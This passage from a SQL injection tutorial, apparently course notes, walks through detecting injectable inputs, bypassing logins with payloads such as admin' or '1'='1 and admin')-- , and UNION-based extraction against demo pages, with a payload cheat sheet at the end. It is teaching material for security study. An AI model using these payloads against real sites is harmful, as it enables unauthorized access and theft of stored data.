+--------+
| 1 != 1 |
+--------+
|      0 |
+--------+
```

</td></tr>
</table>

</details>

<details>
<summary><h4>Operators in Queries</h4></summary>

Operators fine-tune `WHERE` conditions. This query lists all records where the username is **not** `john`:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM logins WHERE username != 'john';
```

</td></tr>
<tr><td colspan="2">

---

```
+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
3 rows in set (0.00 sec)
```

</td></tr>
</table>

Combining conditions — `id` greater than 1 **AND** username not equal to `john`:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM logins WHERE username != 'john' AND id > 1;
```

</td></tr>
<tr><td colspan="2">

---

```
+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
2 rows in set (0.00 sec)
```

</td></tr>
</table>

</details>

<details>
<summary><h4>Multiple Operator Precedence</h4></summary>

SQL also supports arithmetic and bitwise operations, so a query may contain multiple operations at once. Their evaluation order is decided by **operator precedence** (from the MariaDB Documentation):

| Precedence | Operators |
|---|---|
| 1 (highest) | Division (`/`), Multiplication (`*`), Modulus (`%`) |
| 2 | Addition (`+`), Subtraction (`-`) |
| 3 | Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`) |
| 4 | `NOT` (`!`) |
| 5 | `AND` (`&&`) |
| 6 (lowest) | `OR` (`\|\|`) |

Operators at the top are evaluated before those at the bottom. Consider:

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
```

</td></tr>
</table>

This has four operations: `!=`, `AND`, `>`, and `-`. Subtraction has the highest precedence, so `3 - 2` evaluates to `1` first:

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 1;
```

</td></tr>
</table>

Next, the two comparisons (`>` and `!=`, same precedence) are evaluated, then `AND` combines both conditions:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
```

</td></tr>
<tr><td colspan="2">

---

```
+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-03 12:03:53 |
|  3 | john          | john123!   | 2020-07-03 12:03:57 |
+----+---------------+------------+---------------------+
2 rows in set (0.00 sec)
```

</td></tr>
</table>

</details>

</details>

</details>

---

<details>
<summary><h2>🔍 Detecting SQL Injection</h2></summary>

Before exploiting an injection, we first need to confirm the input is injectable.

The first step is to test a simple **payload** appended after our input (for example, after a username) and observe whether it causes **errors** or **changes in the page's behavior**. Any such anomaly signals that the input may be injectable.

The simplest test is a single quote (`'`), which attempts to break out of the query string. Common test payloads and their URL-encoded forms:

| Payload | URL-encoded |
|---|---|
| `'` | `%27` |
| `"` | `%22` |
| `#` | `%23` |
| `;` | `%3B` |
| `)` | `%29` |

> **NOTE:** In some cases the **URL-encoded** version of the payload is required — for example, when the payload is placed directly in the URL (an HTTP GET request), where `'` becomes `%27`.

</details>

---

<details>
<summary><h2>🔓 Subverting Query Logic</h2></summary>

Before executing entire SQL queries, we can modify the **original** query by injecting the `OR` operator and using SQL comments to subvert its logic. A classic example is bypassing web authentication.

> **NOTE:** The panels below reproduce the application's output — the blue line is the **executed query**, followed by the login result.

<details>
<summary><h3>Authentication Bypass</h3></summary>

Consider an administrator login page. We can log in with the valid credentials `admin` / `p@ssw0rd`. The page also displays the SQL query it executes, so we can see how to subvert it:

<table width="100%">
<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
<tr><td>

Executing query:

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

🟢 **Login successful as user: admin**

</td></tr>
</table>

The page uses the `AND` operator to select records matching **both** the username and password. If the database returns a matching record, the condition evaluates to `true` and the login succeeds. With incorrect credentials, the `AND` result is `false`:

<table width="100%">
<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
<tr><td>

Executing query:

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'admin';
```

🔴 **Login failed!**

</td></tr>
</table>

Our goal: log in as `admin` **without** knowing the password.

</details>

<details>
<summary><h3>SQLi Discovery</h3></summary>

First we test whether the form is injectable using one of the discovery payloads (see [Detecting SQL Injection](#-chapter-8-detecting-sql-injection)). Injecting a single quote (`'`) as the username:

<table width="100%">
<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
<tr><td>

Executing query:

```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```

⚠️ **Error:** You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near `'something'` at line 1

</td></tr>
</table>

A SQL error was thrown instead of `Login failed`. Our injected quote produced an **odd number of quotes**, breaking the syntax. Two ways forward:

- **Comment out** the rest of the query (covered in a later section).
- Use an **even number of quotes** so the final query stays valid — the approach used next.

</details>

<details>
<summary><h3>OR Injection</h3></summary>

To bypass authentication, we need the query to **always return true**, regardless of the username/password. We can abuse the `OR` operator.

Per MySQL operator precedence, `AND` is evaluated **before** `OR`. So if the whole query contains at least one `true` condition joined by `OR`, the entire query evaluates to `true` (`OR` returns true if any operand is true).

A condition that is always true is `'1'='1'`. To keep an **even number of quotes**, we drop the last quote and use `'1'='1` — the original query's trailing quote takes its place. Injected as the username:

<table width="100%">
<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
<tr><td>

```sql
admin' or '1'='1
```

</td></tr>
</table>

The resulting query becomes:

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

</td></tr>
</table>

Evaluating by precedence — `AND` first, then `OR`:

```mermaid
flowchart TD
    U["username = 'admin'<br/>✅ True"]
    O["'1'='1'<br/>✅ True"]
    P["password = 'something'<br/>❌ False"]
    AND{"AND"}
    ANDR["❌ False"]
    OR{"OR"}
    R(["✅ True — Login as admin"])

    O --> AND
    P --> AND
    AND --> ANDR
    U --> OR
    ANDR --> OR
    OR --> R

    style U fill:#1a4731,stroke:#6fcf97,stroke-width:2px,color:#fff
    style O fill:#1a4731,stroke:#6fcf97,stroke-width:2px,color:#fff
    style P fill:#8b0000,stroke:#ff6b6b,stroke-width:2px,color:#fff
    style ANDR fill:#8b0000,stroke:#ff6b6b,stroke-width:2px,color:#fff
    style AND fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
    style OR fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
    style R fill:#2a6a4a,stroke:#32cd32,stroke-width:3px,color:#fff
```

- `'1'='1'` is **True**, `password='something'` is **False** → `True AND False` = **False**.
- Then `username='admin'` (**True**) `OR` **False** = **True**.
- The `'1'='1'` branch is irrelevant here; the query returns true because the username `admin` exists, bypassing authentication.

> **NOTE:** This is one of many auth-bypass payloads. A comprehensive list is available in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), each working on certain query types.

</details>

<details>
<summary><h3>Auth Bypass with OR Operator</h3></summary>

Using `admin' or '1'='1` as the username logs us in as `admin`:

<table width="100%">
<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
<tr><td>

Executing query:

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

🟢 **Login successful as user: admin**

</td></tr>
</table>

But what if we **don't** know a valid username? Trying `notAdmin`:

<table width="100%">
<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
<tr><td>

Executing query:

```sql
SELECT * FROM logins WHERE username='notAdmin' or '1'='1' AND password = 'something';
```

🔴 **Login failed!**

</td></tr>
</table>

The login failed because `notAdmin` does not exist, so the overall query is false:

```mermaid
flowchart TD
    U["username = 'notAdmin'<br/>❌ False"]
    O["'1'='1'<br/>✅ True"]
    P["password = 'something'<br/>❌ False"]
    AND{"AND"}
    ANDR["❌ False"]
    OR{"OR"}
    R(["❌ False — Login failed"])

    O --> AND
    P --> AND
    AND --> ANDR
    U --> OR
    ANDR --> OR
    OR --> R

    style U fill:#8b0000,stroke:#ff6b6b,stroke-width:2px,color:#fff
    style O fill:#1a4731,stroke:#6fcf97,stroke-width:2px,color:#fff
    style P fill:#8b0000,stroke:#ff6b6b,stroke-width:2px,color:#fff
    style ANDR fill:#8b0000,stroke:#ff6b6b,stroke-width:2px,color:#fff
    style AND fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
    style OR fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
    style R fill:#8b0000,stroke:#ff6b6b,stroke-width:3px,color:#fff
```

To force an overall true query, we inject an `OR` condition into the **password** field too (`something' or '1'='1`):

<table width="100%">
<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
<tr><td>

Executing query:

```sql
SELECT * FROM logins WHERE username='notAdmin' or '1'='1' AND password = 'something' or '1'='1';
```

🟢 **Login successful as user: admin**

</td></tr>
</table>

Now the `WHERE` clause returns every row, and the user in the first row is logged in. Since both conditions return true, we don't even need a test username/password — we can inject `' or '1'='1` into **both** fields directly:

<table width="100%">
<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
<tr><td>

Executing query:

```sql
SELECT * FROM logins WHERE username='' or '1'='1' AND password = '' or '1'='1';
```

🟢 **Login successful as user: admin**

</td></tr>
</table>

This works because the query evaluates to true irrespective of the username or password.

</details>

<details>
<summary><h3>Using Comments</h3></summary>

Comments let us subvert the logic of more advanced queries — ignoring the trailing part of a query to end up with a working payload that bypasses authentication.

<details>
<summary><h4>Comment Syntax</h4></summary>

Like any language, SQL supports comments to document queries or ignore part of them. MySQL has two line-comment styles — `-- ` and `#` — plus an in-line comment `/* */` (rarely used in basic SQLi).

The `-- ` comment:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT username FROM logins; -- Selects usernames from the logins table
```

</td></tr>
<tr><td colspan="2">

---

```
+---------------+
| username      |
+---------------+
| admin         |
| administrator |
| john          |
| tom           |
+---------------+
4 rows in set (0.00 sec)
```

</td></tr>
</table>

> **NOTE:** Two dashes alone do **not** start a comment — there must be a space after them, so the comment begins with `-- ` (trailing space). In a URL this is often encoded as `--+`, since spaces in URLs are `+`. For clarity, a third dash is commonly appended (`-- -`) to make the space character explicit.

The `#` symbol works too:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```

</td></tr>
<tr><td colspan="2">

---

```
+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
+----+----------+----------+---------------------+
1 row in set (0.00 sec)
```

</td></tr>
</table>

The server ignores everything after `#` — here, the `AND password = 'something'` part is dropped during evaluation.

> **TIP:** In a browser URL, `#` is treated as a fragment tag and is **not** sent to the server. To use `#` as a comment through a browser, URL-encode it as `%23`.

</details>

<details>
<summary><h4>Auth Bypass with Comments</h4></summary>

Back to the login example — inject `admin'-- ` as the username. The resulting query:

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

</td></tr>
</table>

The username is now `admin`, and the remainder of the query is ignored as a comment. This also guarantees no syntax issues from the trailing quote. Logging in with `admin'-- ` and any password:

<table width="100%">
<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
<tr><td>

Executing query:

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'a';
```

🟢 **Login successful as user: admin**

</td></tr>
</table>

Authentication is bypassed — the modified query checks only the username, with no other conditions.

</details>

<details>
<summary><h4>Another Example — Parentheses</h4></summary>

SQL uses parentheses when the app must check certain conditions before others. Expressions inside parentheses take precedence and are evaluated first. Consider a query that forces the user's `id` to be greater than 1 (blocking login as `admin`, whose `id` is 1) and hashes the password before use (blocking injection through the password field):

<table width="100%">
<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
<tr><td>

Executing query:

```sql
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='437b930db84b8079c2dd804a71936b5f';
```

🔴 **Login failed!**

</td></tr>
</table>

Even valid credentials `admin` / `p@ssw0rd` fail, because `admin`'s `id` equals 1:

<table width="100%">
<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
<tr><td>

Executing query:

```sql
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='0f359740bd1cda994f8b55330c86d845';
```

🔴 **Login failed!**

</td></tr>
</table>

Logging in as another user whose `id` is **not** 1, such as `tom`, works:

<table width="100%">
<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
<tr><td>

Executing query:

```sql
SELECT * FROM logins WHERE (username='tom' AND id > 1) AND password='f86a3c565937e6315864d1a43c48e7';
```

🟢 **Login successful as user: tom**

</td></tr>
</table>

So how do we log in as `admin`? Use a comment to cut off the rest of the query — try `admin'-- ` as the username:

<table width="100%">
<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
<tr><td>

Executing query:

```sql
SELECT * FROM logins WHERE (username='admin'-- ' AND id > 1) AND password='437b930db84b8079c2dd804a71936b5f';
```

⚠️ **Error:** You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near `'437b930db84b8079c2dd804a71936b5f'` at line 1

</td></tr>
</table>

The login fails with a syntax error — the open parenthesis was never closed. To fix it, our payload must add a closing parenthesis. Use `admin')-- ` to close and comment out the rest:

<table width="100%">
<tr><td> 🖥️ <b>Admin panel</b> </td></tr>
<tr><td>

Executing query:

```sql
SELECT * FROM logins WHERE (username='admin')-- ' AND id > 1) AND password='437b930db84b8079c2dd804a71936b5f';
```

🟢 **Login successful as user: admin**

</td></tr>
</table>

The query succeeds and we log in as `admin`. The effective query after our input:

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
SELECT * FROM logins WHERE (username='admin')
```

</td></tr>
</table>

Like the earlier example, this returns the row containing `admin`.

</details>

</details>

</details>

---

<details>
<summary><h2>🔗 Union Clause</h2></summary>

So far we have only **manipulated** the original query to subvert logic and bypass authentication (OR operator, comments). Another class of SQLi injects an **entire new query** to run alongside the original — using the MySQL `UNION` clause to perform **UNION injection**.

<details>
<summary><h3>Union</h3></summary>

The `UNION` clause combines the results of multiple `SELECT` statements. Through a UNION injection, we can `SELECT` and dump data from **anywhere** in the DBMS — multiple tables and databases.

First, the `ports` table:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM ports;
```

</td></tr>
<tr><td colspan="2">

---

```
+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
3 rows in set (0.00 sec)
```

</td></tr>
</table>

Then the `ships` table:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM ships;
```

</td></tr>
<tr><td colspan="2">

---

```
+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
1 rows in set (0.00 sec)
```

</td></tr>
</table>

Now combine both with `UNION`:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM ports UNION SELECT * FROM ships;
```

</td></tr>
<tr><td colspan="2">

---

```
+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

</td></tr>
</table>

`UNION` merged both `SELECT` outputs into one result — three rows from `ports` and one from `ships`.

> **NOTE:** The data types of the selected columns must match across all positions.

</details>

<details>
<summary><h3>Even Columns</h3></summary>

`UNION` only operates on `SELECT` statements with an **equal number of columns**. UNIONing two queries with different column counts errors out:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT city FROM ports UNION SELECT * FROM ships;
```

</td></tr>
<tr><td colspan="2">

---

```
ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

</td></tr>
</table>

First `SELECT` returns one column, second returns two → error. Once both queries return the same number of columns, `UNION` can extract data from other tables and databases. Given a vulnerable query:

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
SELECT * FROM products WHERE product_id = 'user_input'
```

</td></tr>
</table>

We inject a `UNION` query so rows from another table are returned (assuming `products` has two columns):

<table width="100%">
<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
<tr><td>

```sql
SELECT * FROM products WHERE product_id = '1' UNION SELECT username, password FROM passwords-- '
```

</td></tr>
</table>

This returns `username` and `password` entries from the `passwords` table.

</details>

<details>
<summary><h3>Un-even Columns</h3></summary>

Usually the original query does **not** have the same column count as the query we want to run — so we pad. Fill the remaining required columns with **junk data** to keep the total column count equal to the original query.

Any string works as junk (`SELECT "junk" FROM passwords` returns `junk`), as do numbers (`SELECT 1 FROM passwords` returns `1`).

> **NOTE:** Junk data types must match the columns' data types, or the query errors. We use **numbers** for simplicity — they also help **track payload positions** later.

> **TIP:** For advanced SQLi, use `NULL` as filler — it fits every data type.

`products` has two columns, so we UNION with two. To grab only `username`, pad the second column with a number:

<table width="100%">
<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
<tr><td>

```sql
SELECT * FROM products WHERE product_id = '1' UNION SELECT username, 2 FROM passwords
```

</td></tr>
</table>

More columns in the original table → add more numbers. If the original `SELECT` hit a four-column table:

<table width="100%">
<tr><td> 🗄️ <b>SQL — Payload</b> </td></tr>
<tr><td>

```sql
UNION SELECT username, 2, 3, 4 FROM passwords-- '
```

</td></tr>
</table>

Result:

<table width="100%">
<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
<tr><td width="20%">

**`mysql>`**

</td><td>

```sql
SELECT * FROM products WHERE product_id UNION SELECT username, 2, 3, 4 FROM passwords-- '
```

</td></tr>
<tr><td colspan="2">

---

```
+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```

</td></tr>
</table>

The wanted output of `UNION SELECT username FROM passwords` lands in the **first column**, while the numbers `2, 3, 4` fill the remaining columns — confirming which positions are reflected.

</details>

</details>

---

<details>
<summary><h2>💉 Union Injection</h2></summary>

Now that we know how `UNION` works, let us use it in a real SQL injection against a web app. Take a port-search page that queries the database with our input:

<table width="100%">
<tr><td> 🔎 <b>Port search</b> </td></tr>
<tr><td>

`GET /search.php?port_code=cn`

| Port Code | Port City | Port Volume |
|---|---|---|
| CN SHA | Shanghai | 37.13 |
| CN SHE | Shenzhen | 23.97 |

</td></tr>
</table>

The `port_code` parameter looks injectable. Apply the SQLi discovery step — inject a single quote (`'`):

<table width="100%">
<tr><td> 🔎 <b>Port search</b> </td></tr>
<tr><td>

`GET /search.php?port_code=cn'`

⚠️ **Error:** You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near `''` at line 1

</td></tr>
</table>

The error confirms the page is likely vulnerable. Since results are reflected on the page, this is ideal for **UNION-based injection**.

<details>
<summary><h3>Detecting the Number of Columns</h3></summary>

Before exploiting, find how many columns the server's `SELECT` returns — the UNION query must match that count. Two methods:

<details>
<summary><h4>Using ORDER BY</h4></summary>

Sort by column index, incrementing until the column no longer exists (error / no output). The last index that sorted successfully is the column count.

> **Reminder:** `-- -` adds a trailing dash so the space after `--` is explicit.

Start at column 1 — always succeeds (at least one column exists):

<table width="100%">
<tr><td> 🔎 <b>Port search</b> </td></tr>
<tr><td>

`GET /search.php?port_code=' order by 1-- -`

| Port Code | Port City | Port Volume |
|---|---|---|
| CN SHA | Shanghai | 37.13 |
| CN SHE | Shenzhen | 23.97 |

</td></tr>
</table>

Sort by column 2 — still works, results ordered differently (as expected):

<table width="100%">
<tr><td> 🔎 <b>Port search</b> </td></tr>
<tr><td>

`GET /search.php?port_code=' order by 2-- -`

| Port Code | Port City | Port Volume |
|---|---|---|
| AE DXB | Dubai | 15.73 |
| BR SSZ | Santos | 3.6 |

</td></tr>
</table>

Columns 3 and 4 also return results. Column 5 errors out:

<table width="100%">
<tr><td> 🔎 <b>Port search</b> </td></tr>
<tr><td>

`GET /search.php?port_code=' order by 5-- -`

⚠️ **Error:** Unknown column '5' in 'order clause'

</td></tr>
</table>

Sorting failed at column 5, so the table has exactly **4 columns**.

</details>

<details>
<summary><h4>Using UNION</h4></summary>

The other way: UNION with a guessed column count until it succeeds. Opposite behavior — ORDER BY returns results until an error; UNION errors until a success. Start with 3 columns:

<table width="100%">
<tr><td> 🔎 <b>Port search</b> </td></tr>
<tr><td>

`GET /search.php?port_code=cn' UNION select 1,2,3-- -`

⚠️ **Error:** The used SELECT statements have a different number of columns

</td></tr>
</table>

Column count mismatch. Try 4 columns:

<table width="100%">
<tr><td> 🔎 <b>Port search</b> </td></tr>
<tr><td>

`GET /search.php?port_code=cn' UNION select 1,2,3,4-- -`

| Port Code | Port City | Port Volume |
|---|---|---|
| 2 | 3 | 4 |

</td></tr>
</table>

Success — the table has **4 columns**. Either method works; once the count is known we can form the payload.

</details>

</details>

<details>
<summary><h3>Location of Injection</h3></summary>

A query may return several columns, but the app may print only some of them. Injecting into a column that is **not** displayed yields no visible output — so we must find which columns are reflected.

In the 4-column UNION above, the query returned `1, 2, 3, 4`, but the page showed only `2, 3, 4`:

<table width="100%">
<tr><td> 🔎 <b>Port search</b> </td></tr>
<tr><td>

`GET /search.php?port_code=cn' UNION select 1,2,3,4-- -`

| Port Code | Port City | Port Volume |
|---|---|---|
| 2 | 3 | 4 |

</td></tr>
</table>

Column 1 is not printed (often an `id` field used to link tables, hidden from the user). Columns **2, 3, 4** are reflected — place the injection in any of them, never in column 1.

> **NOTE:** This is why **numbers** make good junk data — they map directly to reflected positions, so we know where to drop the real query.

Test with real data — swap the number `2` for `@@version` to pull the DB version:

<table width="100%">
<tr><td> 🔎 <b>Port search</b> </td></tr>
<tr><td>

`GET /search.php?port_code=cn' UNION select 1,@@version,3,4-- -`

| Port Code | Port City | Port Volume |
|---|---|---|
| 10.3.22-MariaDB-1ubuntu1 | 3 | 4 |

</td></tr>
</table>

The version prints in the reflected column. We now know how to form UNION payloads that surface query output on the page — next, enumerate the database and dump data from other tables.

</details>

</details>

---

<details>
<summary><h2>📋 Command Reference</h2></summary>

Quick reference of the statements covered so far — this table will grow as more commands are added.

| Command | Utility |
|---|---|
| `mysql -u <user> -p` | Connect to the DBMS (prompted for password) |
| `mysql -u <user> -h <host> -P <port> -p` | Connect to a remote DBMS |
| `CREATE DATABASE <name>;` | Create a new database |
| `SHOW DATABASES;` | List all databases |
| `USE <name>;` | Switch to a database |
| `CREATE TABLE <name> (...);` | Create a new table |
| `SHOW TABLES;` | List tables in the current database |
| `DESCRIBE <table>;` | Show a table's structure (fields + types) |
| `INSERT INTO <table> VALUES (...);` | Add a new record (all columns) |
| `INSERT INTO <table>(cols) VALUES (...);` | Add a new record (selected columns) |
| `SELECT * FROM <table>;` | Retrieve all columns / records |
| `SELECT c1, c2 FROM <table>;` | Retrieve specific columns |
| `DROP TABLE <table>;` | Permanently delete a table |
| `ALTER TABLE <table> ADD/MODIFY/DROP/RENAME ...` | Change a table's structure |
| `UPDATE <table> SET col=val WHERE <cond>;` | Update records matching a condition |
| `SELECT ... ORDER BY col [ASC\|DESC];` | Sort results by one or more columns |
| `SELECT ... LIMIT <count>;` | Limit number of records returned |
| `SELECT ... LIMIT <offset>, <count>;` | Limit results with an offset |
| `SELECT ... WHERE <condition>;` | Filter records by a condition |
| `SELECT ... WHERE col LIKE '<pattern>';` | Filter records by pattern (`%`, `_`) |
| `AND` / `&&` | Logical AND — true only if both conditions are true |
| `OR` / `\|\|` | Logical OR — true if at least one condition is true |
| `NOT` / `!` | Logical NOT — inverts a boolean value |
| `' OR '1'='1` | Auth-bypass payload — forces the `WHERE` clause always true |
| `-- ` / `#` | SQL line comments — ignore the rest of the query (`-- ` needs a trailing space) |
| `/* */` | SQL in-line comment |
| `admin'-- ` | Auth-bypass payload — comments out the password check |
| `admin')-- ` | Auth-bypass payload — closes a parenthesis, then comments out the rest |
| `%23` | URL-encoded `#`, to use it as a comment through a browser |
| `SELECT ... UNION SELECT ...;` | Combine results of two `SELECT`s (must have equal column count + matching types) |
| `UNION SELECT user, 2, 3 FROM t-- ` | UNION injection — dump another table, padding junk (`2,3` / `NULL`) to match columns |
| `' ORDER BY <n>-- -` | Detect column count — increment `<n>` until it errors (last success = column count) |
| `cn' UNION SELECT 1,2,3,4-- -` | Detect column count / reflected positions — numbers map to printed columns |
| `cn' UNION SELECT 1,@@version,3,4-- -` | Confirm data extraction — print DB version in a reflected column |
| `SHOW GRANTS;` | View the current user's privileges |

</details>

---

📘 **Next step:** Continue with [SQLMap Essentials](./15-sqlmap-essentials.md)
